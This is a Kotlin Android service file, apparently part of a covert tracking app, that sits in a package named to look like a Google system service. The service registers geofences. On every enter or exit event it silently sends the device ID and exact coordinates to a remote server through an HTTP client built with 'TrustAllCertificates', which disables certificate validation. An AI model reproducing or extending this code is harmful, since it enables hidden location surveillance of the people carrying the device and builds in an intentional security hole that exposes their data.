package com.google.android.systemservice.services

import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.android.gms.location.*
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

/**
 * Geofence service — alerts when device enters/exits defined zones.
 * Uses Google Play Services GeofencingClient.
 */
class GeofenceService : Service() {

    companion object {
        private const val TAG = "GeofenceService"
        private const val GEOFENCE_RADIUS_M = 200f // 200 meters default
    }

    private lateinit var geofencingClient: GeofencingClient

    override fun onCreate() {
        super.onCreate()
        geofencingClient = LocationServices.getGeofencingClient(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: "add"
        val lat = intent?.getDoubleExtra("latitude", 0.0) ?: 0.0
        val lng = intent?.getDoubleExtra("longitude", 0.0) ?: 0.0
        val radius = intent?.getFloatExtra("radius", GEOFENCE_RADIUS_M) ?: GEOFENCE_RADIUS_M
        val label = intent?.getStringExtra("label") ?: "zone_${System.currentTimeMillis()}"

        when (action) {
            "add" -> addGeofence(label, lat, lng, radius)
            "remove" -> removeGeofence(label)
            "trigger" -> handleGeofenceEvent(intent)
        }

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopForeground(false)
        super.onDestroy()
    }

    private fun addGeofence(label: String, lat: Double, lng: Double, radius: Float) {
        if (lat == 0.0 && lng == 0.0) {
            Log.w(TAG, "Invalid coordinates")
            stopSelf()
            return
        }

        try {
            val geofence = Geofence.Builder()
                .setRequestId(label)
                .setCircularRegion(lat, lng, radius)
                .setExpirationDuration(Geofence.NEVER_EXPIRE)
                .setTransitionTypes(Geofence.GEOFENCE_TRANSITION_ENTER or Geofence.GEOFENCE_TRANSITION_EXIT)
                .build()

            val request = GeofencingRequest.Builder()
                .setInitialTrigger(GeofencingRequest.INITIAL_TRIGGER_ENTER)
                .addGeofence(geofence)
                .build()

            val pendingIntent = PendingIntent.getService(
                this, label.hashCode(),
                Intent(this, GeofenceService::class.java).apply {
                    putExtra("action", "trigger")
                },
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )

            geofencingClient.addGeofences(request, pendingIntent)
                .addOnSuccessListener { Log.d(TAG, "Geofence '$label' added at $lat,$lng r=$radius") }
                .addOnFailureListener { Log.e(TAG, "Failed to add geofence: ${it.message}") }
        } catch (e: SecurityException) {
            Log.e(TAG, "Missing location permission: ${e.message}")
        }
    }

    private fun removeGeofence(label: String) {
        geofencingClient.removeGeofences(listOf(label))
            .addOnSuccessListener { Log.d(TAG, "Geofence '$label' removed") }
            .addOnFailureListener { Log.e(TAG, "Failed to remove: ${it.message}") }
    }

    private fun handleGeofenceEvent(intent: Intent?) {
        val event = GeofencingEvent.fromIntent(intent ?: return)
        if (event == null || event.hasError()) {
            Log.e(TAG, "Geofence event error: ${event?.errorCode}")
            return
        }

        val transition = when (event.geofenceTransition) {
            Geofence.GEOFENCE_TRANSITION_ENTER -> "ENTER"
            Geofence.GEOFENCE_TRANSITION_EXIT -> "EXIT"
            else -> "UNKNOWN"
        }

        val zones = event.triggeringGeofences?.map { it.requestId } ?: emptyList()
        val location = event.triggeringLocation

        Log.d(TAG, "Geofence $transition: zones=$zones")

        // Send alert to server
        Thread {
            try {
                val payload = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("transition", transition)
                    put("zones", zones.joinToString(","))
                    put("latitude", location?.latitude ?: 0.0)
                    put("longitude", location?.longitude ?: 0.0)
                    put("timestamp", System.currentTimeMillis())
                }

                val client = TrustAllCertificates.createClientBuilder().build()
                val body = payload.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("${AndroidConfig.apiBaseUrl}/geofence")
                    .post(body)
                    .build()

                client.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send geofence alert: ${e.message}")
            }
        }.start()
    }
}
